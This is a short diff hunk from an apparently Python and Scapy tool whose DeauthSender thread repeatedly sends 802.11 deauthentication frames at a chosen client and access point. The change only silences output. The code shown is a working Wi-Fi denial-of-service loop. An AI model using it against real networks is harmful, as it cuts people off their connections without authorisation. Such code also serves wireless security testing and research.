@@ -18,4 +18,4 @@ class DeauthSender(threading.Thread):
         deauth = RadioTap() / Dot11(
             type=0, subtype=12, addr1=self.target_client, addr2=self.target_ap, addr3=self.target_ap) / Dot11Deauth(reason=4)
         while not self.stop:
-            sendp(deauth, iface=self.iface)
+            sendp(deauth, iface=self.iface, verbose=False)
